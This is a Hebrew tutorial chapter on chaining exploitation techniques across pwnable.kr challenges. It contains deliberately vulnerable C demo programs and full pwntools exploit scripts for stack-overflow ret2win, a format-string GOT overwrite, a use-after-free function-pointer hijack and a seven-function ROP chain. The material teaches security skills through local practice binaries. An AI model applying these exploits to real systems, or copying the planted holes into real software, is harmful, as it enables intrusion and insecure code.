עד עכשיו לימדנו כל טכניקה בבידוד: פרק 2 גלישת מחסנית ו-ret2win, פרק 4 שרשראות ROP, פרק 5 חולשות format string, פרק 7 ניצול heap ו-UAF. אבל אתגר אמיתי כמעט אף פעם לא מגיש לכם באג נקי אחד עם פתרון של שורה. הוא מגיש שירות עם תפריט, מדינת מצבים שצריך לנווט בה, ובאג שבפני עצמו לא נותן shell - צריך לחבר אותו לפרימיטיב שליטה, לפעמים דרך כמה פעולות ברצף. בשיעור הזה נלמד לחשוב בשרשראות: איך לוקחים באג (גלישה, UAF, format string, בלבול טיפוסים) והופכים אותו לשליטה מלאה. נעשה את זה דרך חמישה אתגרים קלאסיים מ-pwnable.kr - echo1, echo2, loveletter, dragon ו-horcruxes - כשהכוכב הוא horcruxes, שבו נבנה שרשרת ROP שקוראת לשבע פונקציות בזו אחר זו.

## אנטומיה של אתגר משולב - הבאג, הפרימיטיב, והמטען

כל ניצול, גם המורכב ביותר, מתפרק לשלושה חלקים. שווה להטמיע את החלוקה הזו כי היא הופכת אתגר מבלבל למשהו שיטתי:

```text
+----------------+      +----------------------+      +-------------------+
| הבאג           | ---> | הפרימיטיב            | ---> | המטען             |
| (איפה שוברים)  |      | (מה השגתי מהבאג)     |      | (מה עושים עם זה)  |
+----------------+      +----------------------+      +-------------------+
 גלישת מחסנית           שליטה ב-RIP / כתיבה       ret2win / ROP / shell
 UAF                    שליטה ב-fptr / vptr        קפיצה ל-get_shell
 format string          קריאה+כתיבה שרירותית       דריסת GOT
 בלבול טיפוסים          אובייקט מזויף              שרשרת קריאות
```

הטעות הנפוצה של מתחילים היא לחפש "את הפתרון". במקום זה תשאלו שלוש שאלות בסדר: איפה הבאג? לאיזה פרימיטיב הוא מתרגם? ואיזה מטען הפרימיטיב הזה מאפשר? באתגרי תפריט מתווספת שכבה רביעית: התוכנית היא מכונת מצבים, ואתם צריכים לנווט אותה - להקצות, לשחרר, למלא, ולהפעיל - בסדר הנכון כדי שהבאג בכלל יצוץ. זה בדיוק ההבדל בין השיעורים הקודמים לשיעור הזה: כאן הפעולות מרובות ותלויות סדר.

עוד עיקרון מרכזי שיחזור: **לדלוף לפני שכותבים**. אם יש ASLR או PIE, אין לכם כתובות קבועות, אז שלב ראשון בשרשרת הוא לדלוף כתובת (heap, stack או libc), לחשב ממנה בסיס, ורק אז לבנות את הכתיבה. בחלק מהאתגרים כאן ההגנות כבויות (No PIE), וזה חוסך את שלב הדליפה - שימו לב בכל אתגר מה מצב ההגנות עם `checksec`, כי זה קובע כמה שלבים השרשרת תצטרך.

## שירות echo1 - גלישת מחסנית וחזרה לפונקציה מנצחת

נתחיל מהפשוט. האתגר `echo1` הוא שירות תפריט שקורא ממכם שם, ואז מציע כמה סוגי "echo". פונקציית ה-echo קוראת קלט לתוך חוצץ קטן על המחסנית עם `read` שמתיר יותר בתים מגודל החוצץ - גלישה קלאסית בדיוק כמו בפרק 2. בבינארי יש פונקציה `get_shell` שאף אחד לא קורא לה בזרימה הרגילה. ההגנות: NX פעיל, בלי קנרי, No PIE. כלומר כתובת `get_shell` קבועה, והפרימיטיב (שליטה ב-RIP) מתרגם ישירות למטען הכי פשוט שיש - `ret2win`.

הנה מודל מקומי נקי שמשחזר את המבנה:

```c
// echo1_demo.c
// gcc -fno-stack-protector -no-pie -o echo1_demo echo1_demo.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char name[64];

void get_shell() { system("/bin/sh"); }   // אף אחד לא קורא לה בזרימה הרגילה

void echo() {
    char buf[32];
    printf("echo> ");
    read(0, buf, 128);      // גלישה: buf בגודל 32, קוראים 128
    printf("%s\n", buf);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("your name: ");
    read(0, name, 63);
    int op;
    while (1) {
        printf("1.echo 2.exit > ");
        if (scanf("%d%*c", &op) != 1) break;
        if (op == 1) echo();
        else break;
    }
    return 0;
}
```

ה-offset עד כתובת החזרה הוא 32 בתים חוצץ ועוד 8 בתים `saved rbp`, כלומר 40. את זה תמדדו עם `cyclic` כמו תמיד. הזרימה: מנווטים בתפריט לאופציה 1, מציפים את `buf`, דורסים את כתובת החזרה של `echo` בכתובת `get_shell`. שימו לב למלכודת ה-`movaps` מפרק 2 - `get_shell` קוראת ל-`system`, אז נוסיף גאדג'ט `ret` בודד ליישור המחסנית ל-16 בתים:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./echo1_demo')

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]      # יישור ל-64 ביט

p = process()
p.sendlineafter(b'name: ', b'me')
p.sendlineafter(b'> ', b'1')           # נכנסים ל-echo

payload = flat({40: [ret, elf.symbols['get_shell']]})
p.sendafter(b'echo> ', payload)
p.interactive()
```

מתי היינו צריכים `ret2shellcode` במקום `ret2win`? רק אם לא הייתה פונקציה מנצחת בבינארי **וגם** ה-NX היה כבוי (או שהיה אזור זיכרון עם הרשאת הרצה). אז היינו כותבים shellcode לתוך `buf` או לתוך `name` הגלובלי בכתובת הקבועה, וקופצים אליו. אבל עם NX פעיל זה מת מראש - הקוד על המחסנית לא יורץ. הלקח מ-echo1: כשיש `get_shell` ואין קנרי, גלישה על המחסנית היא ret2win של שתי שורות. הכל כאן זה לזהות שהתפריט מוביל לפונקציה עם גלישה.

## שירות echo2 - format string כפרימיטיב כתיבה

האתגר `echo2` מעלה מדרגה. הוא שירות echo דומה, אבל עם שני באגים ששזורים יחד: חולשת format string באחת מפעולות התפריט (התוכנית מבצעת `printf` על קלט המשתמש ישירות), וחולשת שימוש לאחר שחרור על החוצץ שמחזיק את ההודעה (הוא מוקצה ב-heap, משוחרר באחת הפעולות, ועדיין בשימוש באחרת). הפרימיטיב שנקבל מה-format string הוא קריאה וכתיבה שרירותיות - בדיוק מה שלמדנו בפרק 5.

נתחיל מהחצי הנקי: format string כשהחוצץ על **המחסנית**. זה מודל של המנגנון שנשתמש בו:

```c
// fsb_demo.c  (מדמה את חצי ה-format string של echo2)
// gcc -fno-stack-protector -no-pie -o fsb_demo fsb_demo.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_shell() { system("/bin/sh"); }

void echo() {
    char buf[128];
    printf("say> ");
    read(0, buf, 128);
    printf(buf);        // חולשת format string - buf על המחסנית
    printf("\n");
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    while (1) echo();
    return 0;
}
```

הרעיון: מכיוון שהקלט נמצא על המחסנית, אנחנו יכולים להטמיע בו כתובת יעד ולהתייחס אליה עם ספציפייר מיקום (`%N$n`). נדרוס את הכניסה של `printf` בטבלת ה-GOT בכתובת של `get_shell`. ברגע שהתוכנית תקרא שוב ל-`printf` (למשל ה-`printf("\n")` מיד אחרי, או ההדפסה בסבב הבא של הלולאה), הקריאה תופנה דרך ה-GOT ל-`get_shell`. הספרייה `pwntools` בונה את המטען הזה לבד עם `fmtstr_payload`:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./fsb_demo')

# את ה-offset מוצאים בבדיקה ידנית: שולחים b'AAAA.%p.%p.%p...' ורואים
# באיזה מיקום חוזר 0x41414141. בצורה הזו לרוב יוצא 6.
offset = 6
writes = {elf.got['printf']: elf.symbols['get_shell']}
payload = fmtstr_payload(offset, writes)

p = process()
p.sendafter(b'say> ', payload)        # printf(buf) מבצע את הכתיבה ל-GOT
p.interactive()                       # ה-printf הבא קופץ ל-get_shell
```

עכשיו הפואנטה של echo2 האמיתי, ולמה הוא קשה יותר מהדמו: שם החוצץ של ההודעה נמצא ב-**heap** (הוא `malloc`), לא על המחסנית. זה שובר את הטריק של "להטמיע כתובת בתוך מחרוזת הפורמט ולהתייחס אליה", כי הספציפייר `%N$n` יכול להגיע רק לארגומנטים שעל המחסנית - והמחרוזת שלנו לא שם. לכן ב-echo2 משלבים: משתמשים ב-format string כדי **לדלוף** (קוראים כתובות שכבר יושבות על המחסנית עם `%p`, מחשבים בסיסים), ובחצי השני מנצלים את ה-UAF - משחררים את חוצץ ההודעה ומקצים אותו מחדש כך שנשתלט על מצביע פונקציה או על מבנה שהתוכנית משתמשת בו. זו הדגמה מושלמת לעיקרון "לדלוף לפני שכותבים" ולעיקרון "לנווט את מכונת המצבים": הפעולות של set, echo ו-free חייבות לבוא בסדר הנכון כדי שגם הדליפה וגם המיחזור יעבדו. את הצעדים המדויקים נעשה בתרגול ובפתרון.

## אתגר loveletter - גלישה בשירות טקסט לחטיפת בקרה

האתגר `loveletter` הוא ממשפחת שירותי הטקסט: תוכנית שמקבלת מכם "מכתב" (מחרוזת), מעבדת אותו, ובאחד המסלולים מעתיקה אותו לחוצץ מקומי בלי לבדוק גבולות - גלישת מחסנית. מבחינת הרעיון אין כאן שום דבר חדש מעבר לפרק 2 ולפרק 4: מוצאים את ה-offset לכתובת החזרה עם `cyclic`, ובונים מטען. מה שכן משתנה זה **סוג הקלט**, וזה משנה איזה מטען מותר:

- אם הגלישה היא דרך `read`/`fread`, מותרים כל הבתים כולל `\x00`, אז אפשר לכתוב כתובות מלאות ולבנות שרשרת ROP חופשית.
- אם הגלישה היא דרך `strcpy`, `gets` או `scanf("%s")`, הקלט נקטע ב-null או ברווח. אז כתובות עם בית אפס באמצע נחתכות, וצריך לבחור גאדג'טים וכתובות "נקיים", או להשתמש בטריקים מפרק 3 ל"בתים אסורים".

הזרימה למול שירות טקסט כזה זהה למה שכבר עשיתם: `checksec` לזהות הגנות, `cyclic` ל-offset, ואז - אם יש `get_shell` בבינארי - `ret2win`; ואם אין, `ret2libc` או שרשרת ROP מפרק 4 שקוראת ל-`system("/bin/sh")`. הנקודה שכדאי לקחת מ-loveletter היא לזהות בתוך שירות עם כמה מסלולים איזה מסלול הוא הפגיע, ולוודא שהמטען שלכם עובר את מגבלות הקלט של אותו מסלול.

## המשחק dragon - שימוש לאחר שחרור ובלבול טיפוסים

האתגר `dragon` הוא משחק תפריט שבו נלחמים במפלצות. מאחורי המשחק החמוד מסתתר שילוב של שימוש לאחר שחרור ובלבול טיפוסים: אובייקטים של דמויות ומפלצות מוקצים על ה-heap, ובאחד המסלולים אובייקט **משוחרר** אבל התוכנית עדיין ניגשת אליו - ובתוכו יש **מצביע פונקציה** שהמשחק קורא לו. אם נצליח, ברצף הנכון של פעולות תפריט, לגרום למקצה להחזיר את הבלוק המשוחרר להקצאה חדשה שאנחנו ממלאים, נשתול מצביע פונקציה משלנו, והמשחק יקפוץ אליו. היעד: פונקציה נסתרת בבינארי (למשל `secret_level`) שמדפיסה את הדגל או פותחת shell.

נבנה מודל שמזקק את התבנית הזו:

```c
// dragon_demo.c
// gcc -m32 -fno-stack-protector -no-pie -o dragon_demo dragon_demo.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

typedef struct {
    int hp;
    void (*attack)(void);   // מצביע פונקציה בתוך האובייקט
} Character;

Character *monster;

void secret_level() {
    puts("secret level! flag: FLAG{dragon_uaf_type_confusion}");
    system("/bin/sh");
}
void normal_attack() { puts("a normal swing..."); }

void fight() {
    monster = malloc(sizeof(Character));   // בלוק בגודל 8 (32 ביט)
    monster->hp = 20;
    monster->attack = normal_attack;
    puts("you slay the monster.");
    free(monster);                         // משוחרר, אבל המצביע נשמר -> תלוי
}
void loot() {
    char *data = malloc(sizeof(Character));   // אותו גודל -> ממחזר את monster
    printf("pick up loot (8 bytes): ");
    read(0, data, sizeof(Character));         // אנחנו שולטים ב-monster->attack
}
void taunt() { monster->attack(); }           // UAF: קורא attack של אובייקט משוחרר

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    int op;
    while (1) {
        printf("1.fight 2.loot 3.taunt 4.exit > ");
        if (scanf("%d%*c", &op) != 1) break;
        if (op == 1) fight();
        else if (op == 2) loot();
        else if (op == 3) taunt();
        else break;
    }
    return 0;
}
```

הריקוד: fight מקצה את המפלצת, ומיד משחרר אותה - נולד מצביע תלוי. loot מקצה בלוק **מאותו גודל**, אז המקצה מחזיר לנו את אותו בלוק בדיוק, ואנחנו כותבים לתוכו `hp` כלשהו ואת הכתובת של `secret_level` בשדה `attack`. taunt קורא ל-`monster->attack()` - שהוא עכשיו `secret_level`.

```text
fight():  monster --> +--------+--------------+
                      |  hp=20 | normal_attack|   בלוק 0x10 ב-heap
                      +--------+--------------+
          free(monster):  הבלוק ב-tcache, monster עדיין מצביע אליו (תלוי)

loot():   malloc(8) מחזיר אותו בלוק, read ממלא:
          monster --> +--------+--------------+
          (תלוי)      |  AAAA  | secret_level |   <-- הנתונים שלנו
                      +--------+--------------+

taunt():  monster->attack()  ==  secret_level()   -> shell
```

וה-exploit:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./dragon_demo')

p = process()
p.sendlineafter(b'> ', b'1')      # fight  -> malloc + free (מצביע תלוי)
p.sendlineafter(b'> ', b'2')      # loot   -> ממחזר את הבלוק המשוחרר
p.send(p32(0xdead) + p32(elf.symbols['secret_level']))   # hp + attack מזויף
p.sendlineafter(b'> ', b'3')      # taunt  -> monster->attack() = secret_level
p.interactive()
```

זה עובד רק כי הבינארי No PIE, אז הכתובת של `secret_level` קבועה ואפשר לכתוב אותה קשיח. אם היה PIE, היינו צריכים קודם לדלוף כתובת קוד (למשל דרך פן הקריאה של אותו UAF). באתגר האמיתי `dragon` צריך לזהות לבד את גודל האובייקטים כדי שההקצאה החדשה תיפול על אותה מחלקת גודל, ואת רצף המסלולים המדויק במשחק שמשחרר אובייקט ואז מפעיל את המצביע שבתוכו - זו העבודה של הנדסה הפוכה על התפריט. אבל התבנית זהה בדיוק לדמו: free, ואז alloc-שממלא, ואז use.

## האתגר horcruxes - שרשרת ROP של שבע פונקציות

האתגר `horcruxes` הוא הכוכב של השיעור, כי הוא לוקח את ה-`ret2win` מפרק 2 והופך אותו לשרשרת של **שבע קריאות רצופות**. הבינארי הוא 32 ביט, NX פעיל, בלי קנרי, No PIE. יש שבע פונקציות, נקרא להן `A` עד `G` (בהשראת ההורקרוקסים). כל אחת מגרילה ערך אקראי, שומרת אותו במשתנה גלובלי, ו**מדפיסה** אותו. יש פונקציה שבודקת אם הקלט שלכם שווה לסכום שבעת הערכים, ואם כן נותנת את הדגל או shell. הבעיה: בזרימה הרגילה אף אחד לא קורא ל-`A` עד `G`, אז כל הגלובלים אפס, והסכום אפס. יש גם פונקציה `ropme` עם גלישת מחסנית.

הרעיון הגאוני: נשתמש בגלישה ב-`ropme` כדי לבנות שרשרת ROP שקוראת ל-`A`, `B`, `C`, `D`, `E`, `F`, `G` בזו אחר זו. כל אחת תגריל את הערך שלה, תעדכן את הגלובל, ותדפיס לנו את הערך. אנחנו נאסוף את שבעת הערכים המודפסים, נסכם אותם, והשרשרת תסתיים בחזרה אל הפונקציה שקוראת את הניחוש ובודקת מול הסכום. עכשיו הסכום כבר לא אפס, ואנחנו יודעים אותו בדיוק כי הפונקציות הדליפו לנו את הערכים.

הנה הנקודה החשובה שהופכת את זה לאלגנטי במיוחד ב-32 ביט: הפונקציות `A` עד `G` **לא מקבלות ארגומנטים**. בקונבנציית cdecl, קריאה בלי ארגומנטים לא דורשת שום גאדג'ט `pop` - השרשרת היא פשוט רשימה של כתובות הפונקציות בזו אחר זו. כל פונקציה מסתיימת ב-`ret`, שמוציא מהמחסנית את הכתובת הבאה - כלומר את הפונקציה הבאה בתור. אין ניקוי מחסנית, אין ריפוד בין הקריאות. פשוט מסדרים את שבע הכתובות ברצף:

```text

כתובות נמוכות (ראש המחסנית)
+---------------------------+
| padding עד כתובת החזרה     |  <-- ממלא את buf ואת saved ebp
+---------------------------+
| כתובת A                   |  <-- ה-ret של ropme קופץ לכאן
+---------------------------+
| כתובת B                   |  <-- ה-ret של A קופץ לכאן
+---------------------------+
| כתובת C                   |
+---------------------------+
| כתובת D                   |
+---------------------------+
| כתובת E                   |
+---------------------------+
| כתובת F                   |
+---------------------------+
| כתובת G                   |  <-- ה-ret של F קופץ לכאן
+---------------------------+
| כתובת פונקציית הבדיקה      |  <-- ה-ret של G קופץ לכאן
+---------------------------+
כתובות גבוהות
```

שימו לב כמה זה נקי: אין `pop reg` בין הכתובות כי אף פונקציה לא מקבלת פרמטרים. אילו הפונקציות היו מקבלות ארגומנט, היינו צריכים אחרי כל כתובת סלוט לכתובת חזרה ואז סלוט לארגומנט (כמו ב-cdecl בפרק 2). כאן, בזכות היעדר הארגומנטים, זו פשוט שרשרת כתובות.

נבנה מודל מקומי מדויק:

```c
// horcruxes_demo.c
// gcc -m32 -fno-stack-protector -no-pie -o horcruxes_demo horcruxes_demo.c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

int a, b, c, d, e, f, g;

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    srand(time(NULL));
}

void A() { a = rand() % 0xface + 1; printf("horcrux A : %d\n", a); }
void B() { b = rand() % 0xface + 1; printf("horcrux B : %d\n", b); }
void C() { c = rand() % 0xface + 1; printf("horcrux C : %d\n", c); }
void D() { d = rand() % 0xface + 1; printf("horcrux D : %d\n", d); }
void E() { e = rand() % 0xface + 1; printf("horcrux E : %d\n", e); }
void F() { f = rand() % 0xface + 1; printf("horcrux F : %d\n", f); }
void G() { g = rand() % 0xface + 1; printf("horcrux G : %d\n", g); }

void voldemort() {                       // פונקציית הבדיקה
    int sum = a + b + c + d + e + f + g;
    int guess = 0;
    printf("how many EXP did you earn? : ");
    scanf("%d", &guess);
    if (guess == sum) {
        puts("Congratz! flag: FLAG{h0rcrux_r0p_7_functions}");
        system("/bin/sh");
    } else {
        printf("you fool. the soul was %d\n", sum);
    }
}

void ropme() {
    char buf[100];
    printf("tell me a secret : ");
    read(0, buf, 512);                   // גלישה: buf בגודל 100, קוראים 512
}

int main() {
    init();
    ropme();
    puts("bye");
    return 0;
}
```

עכשיו ה-exploit המלא. שני חלקים מעניינים: בניית השרשרת מכתובות הסמלים, ואיסוף שבעת הערכים המודפסים כדי לסכם אותם ולשלוח בחזרה:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./horcruxes_demo')

# את ה-offset מודדים עם cyclic. עבור buf[100] ב-32 ביט לרוב יוצא סביב 112.
offset = 112

chain = flat(
    b'A' * offset,
    elf.symbols['A'], elf.symbols['B'], elf.symbols['C'], elf.symbols['D'],
    elf.symbols['E'], elf.symbols['F'], elf.symbols['G'],
    elf.symbols['voldemort'],     # ה-ret של G קופץ לפונקציית הבדיקה
)

p = process('./horcruxes_demo')
p.recvuntil(b'secret : ')
p.sendline(chain)

# שבע הפונקציות הדליפו את הערכים - אוספים ומסכמים
total = 0
for name in 'ABCDEFG':
    line = p.recvline_contains(b'horcrux ' + name.encode())
    val = int(line.split(b':')[1].strip())
    total += val
    log.info('%s = %d', name, val)

log.success('sum = %d', total)
p.recvuntil(b'earn? : ')
p.sendline(str(total).encode())
p.interactive()
```

הזרימה מלמעלה למטה: `ropme` מבצעת `ret` וקופצת ל-`A`; `A` מגרילה, מדפיסה, ומבצעת `ret` שקופץ ל-`B`; וכך הלאה עד `G`; ה-`ret` של `G` קופץ ל-`voldemort`, שמחשבת את הסכום מהגלובלים המעודכנים, קוראת את הניחוש שלנו, ומשווה. מכיוון שקראנו את שבעת הערכים מהפלט, אנחנו שולחים בדיוק את הסכום הנכון - וה-`if` עובר.

באתגר האמיתי יש שני הבדלים קטנים ששווה לדעת. ראשית, פונקציית הבדיקה היא לרוב חלק מ-`ropme` עצמה, אז החזרה האחרונה בשרשרת היא לכתובת **בתוך** `ropme` (drug ret2win אל אמצע פונקציה), לא לפונקציה נפרדת - אבל העיקרון זהה. שנית, לפעמים צריך לשים לב לערך שכל פונקציה מדפיסה ולפורמט שלו כדי לפרסר נכון. הכלי `recvline_contains` הופך את הפרסור לפשוט. את הכתובות של `A` עד `G` שולפים ישר מהבינארי עם `nm horcruxes | grep ' [A-G]$'` או, כמו כאן, עם `elf.symbols`.

## עקרונות שחוזרים בשרשור טכניקות

חמשת האתגרים חלקו כמה עקרונות שכדאי להפנים לפני שממשיכים:

- **פרקו לבאג, פרימיטיב, מטען.** אל תחפשו "פתרון". זהו איפה שוברים, מה מקבלים, ומה עושים עם זה.
- **נווטו את מכונת המצבים.** בשירותי תפריט הבאג צץ רק אחרי רצף פעולות מסוים - הקצאה, שחרור, מילוי, הפעלה - בסדר הנכון. חשבו על התפריט כעל שרשרת קריאות שאתם מלחינים.
- **לדלוף לפני שכותבים.** אם יש PIE או ASLR, שלב ראשון הוא דליפה. בלי דליפה אין לכם כתובות, ובלי כתובות אין מטען. כשההגנות כבויות (No PIE) - זה החלק שנחסך לכם.
- **מיחזור לפי גודל.** ניצול UAF ובלבול טיפוסים חי או מת על השאלה אם ההקצאה הבאה נופלת על מחלקת הגודל של הבלוק המשוחרר. תמדדו את גודל האובייקט.
- **בלי ארגומנטים אין גאדג'טים.** ב-32 ביט, שרשור פונקציות שלא מקבלות פרמטרים הוא פשוט רשימת כתובות - זה בדיוק מה שהפך את horcruxes לנקי כל כך.

## סיכום

- אתגר משולב מתפרק תמיד לשלושה: הבאג, הפרימיטיב שהוא נותן, והמטען שהפרימיטיב מאפשר - ובשירותי תפריט מתווספת שכבת ניווט של מכונת מצבים.
- `echo1` - גלישת מחסנית בשירות echo שמתרגמת ל-`ret2win` על `get_shell`; זכרו את יישור ה-`movaps` מול `system`.
- `echo2` - שילוב format string (קריאה+כתיבה, דליפה ודריסת GOT) עם UAF; הקושי האמיתי הוא שחוצץ ההודעה על ה-heap, ולכן צריך לדלוף ולמחזר ולא רק לכתוב ישר.
- `loveletter` - גלישת מחסנית בשירות טקסט; אותה טכניקה מפרק 2 ו-4, אבל סוג הקלט (`read` מול `strcpy`/`gets`) קובע אילו בתים מותרים במטען.
- `dragon` - UAF ובלבול טיפוסים בתפריט משחק: משחררים אובייקט עם מצביע פונקציה, ממחזרים אותו בהקצאה שאנחנו ממלאים, ושותלים כתובת של פונקציה מנצחת.
- `horcruxes` - שרשרת ROP שקוראת לשבע פונקציות בזו אחר זו (רשימת כתובות פשוטה כי אין ארגומנטים), אוספת את הערכים שהן מדליפות, ומסיימת בחזרה לפונקציה שבודקת את הסכום.
